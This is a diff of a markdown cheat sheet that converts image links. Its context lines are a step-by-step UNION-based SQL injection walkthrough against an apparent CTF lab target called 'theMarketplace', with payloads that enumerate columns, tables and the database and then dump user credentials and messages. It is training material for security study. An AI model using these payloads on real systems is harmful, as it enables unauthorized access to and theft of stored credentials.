@@ -28,9 +28,9 @@ img_path: /Cheatsheet/Web/SQLi/images
 ## Database Enumeration GET
 
 1. Query
-	![[theMarketplace query.png]]
+	![](theMarketplace query.png)
 2. Determine if query is susceptible to SQLi
-	![[theMarketplace SQLi susceptible.png]] 	
+	![](theMarketplace SQLi susceptible.png)
 3. Hypothesis 1
 	```
 	# SQL Query
@@ -50,7 +50,7 @@ img_path: /Cheatsheet/Web/SQLi/images
 	# Payload
 	user=1 ORDER BY 1
 	```
-	![[theMarketplace found no. of columns.png]]
+	![](theMarketplace found no. of columns.png)
 5. Hypothesis 2
 	```
 	# Failed at ORDER BY 5 Because only querying 4 columns
@@ -65,7 +65,7 @@ img_path: /Cheatsheet/Web/SQLi/images
 	# Payload
 	user=-1 UNION SELECT 1,2,3,4
 	```
-	![[theMarketplace found which columns reflected.png]]
+	![](theMarketplace found which columns reflected.png)
 	- Reflected Columns: 1,2
 7. Determine current database
 	```
@@ -75,7 +75,7 @@ img_path: /Cheatsheet/Web/SQLi/images
 	# Payload
 	user=-1 UNION SELECT database(),database(),3,4
 	```
-	![[theMarketplace sqli found database name.png]]
+	![](theMarketplace sqli found database name.png)
 	- Database Name: marketplace
 8. If you want to determine all the databases
 	```
@@ -95,7 +95,7 @@ img_path: /Cheatsheet/Web/SQLi/images
 	## group_concat is used to append all the tables into one column to be displayed
 	
 	```
-	![[theMarketplace sqli found tables.png]]
+	![](theMarketplace sqli found tables.png)
 	- Tables in marketplace database:
 		- items
 		- messages
@@ -108,7 +108,7 @@ img_path: /Cheatsheet/Web/SQLi/images
 	# Payload
 	user=0 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'
 	```
-	![[theMarketplace sqli found columns in user table.png]]
+	![](theMarketplace sqli found columns in user table.png)
 	- Table: `Users`
 		- isAdministrator: 1 or 0
 		- password: hash
@@ -121,7 +121,7 @@ img_path: /Cheatsheet/Web/SQLi/images
 	# Payload
 	0 union select 1,group_concat(id,':',username,':',password,':',isAdministrator,'\n'),3,4 from marketplace.users-- -
 	```
-	![[theMarketplace sqli found value of columns in table users.png]]
+	![](theMarketplace sqli found value of columns in table users.png)
 	- Table: `users`
 		- Column: username+password
 		```
@@ -138,7 +138,7 @@ img_path: /Cheatsheet/Web/SQLi/images
 	# Payload
 	user=0 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='messages'
 	```
-	![[theMarketplace sqli found columns in messages table.png]]
+	![](theMarketplace sqli found columns in messages table.png)
 	- Table: `messages`
 		- is_read: 1 or 0
 		- message_content: String
@@ -155,7 +155,7 @@ img_path: /Cheatsheet/Web/SQLi/images
 	# Use group_concat to append all message_content from all users into one single column value for display
 	
 	```
-	![[theMarketplace sqli found value in columns in table messages.png]]
+	![](theMarketplace sqli found value in columns in table messages.png)
 	- Table `messages`
 		- Column: user_to+message_content
 			```
